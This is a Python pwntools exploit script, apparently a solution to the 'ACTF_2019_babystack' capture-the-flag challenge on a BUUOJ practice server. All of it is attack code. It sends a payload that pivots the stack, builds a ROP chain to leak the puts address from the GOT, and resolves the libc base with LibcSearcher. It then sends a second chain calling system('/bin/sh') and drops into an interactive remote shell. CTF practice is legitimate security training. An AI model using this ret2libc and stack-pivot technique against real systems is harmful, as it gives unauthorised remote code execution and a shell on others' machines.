from pwn import*
from LibcSearcher import*
context.log_level = 'debug'

elf = ELF('ACTF_2019_babystack')

#sh = process('./ACTF_2019_babystack')
sh = remote('node3.buuoj.cn',28474)
sh.sendlineafter('>','224')
sh.recvuntil('Your message will be saved at ')
buf_addr = int(sh.recvuntil('\n'),16)
print hex(buf_addr)

payload = 'A'*8
payload += p64(0x0000000000400ad3) #pop rdi ret
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(0x00400800) #start
payload = payload.ljust(0xd0,'A')
payload += p64(buf_addr)
payload += p64(0x0400A18)
#gdb.attach(sh)
sh.send(payload)
sh.recvuntil('Byebye~\n')
puts_addr = u64(sh.recv(6).ljust(8,'\x00'))
print "puts_addr===>" + hex(puts_addr)

libc = LibcSearcher('puts',puts_addr)
libc_addr = puts_addr - libc.dump('puts')
system_addr = libc_addr + libc.dump('system')
bin_sh_addr = libc_addr + libc.dump('str_bin_sh')
print "libc====>"+str(hex(libc_addr))

sh.sendlineafter('>','224')
sh.recvuntil('Your message will be saved at ')
buf_addr = int(sh.recvuntil('\n'),16)
print hex(buf_addr)

payload = 'A'*8
payload += p64(0x0000000000400709) #ret
payload += p64(0x0000000000400ad3) #pop_rdi ret
payload += p64(bin_sh_addr)
payload += p64(system_addr)
payload += p64(0xdeadbeef)
payload = payload.ljust(0xd0,'A')
payload += p64(buf_addr)
payload += p64(0x0400A18)
#gdb.attach(sh)
sh.send(payload)

sh.interactive()
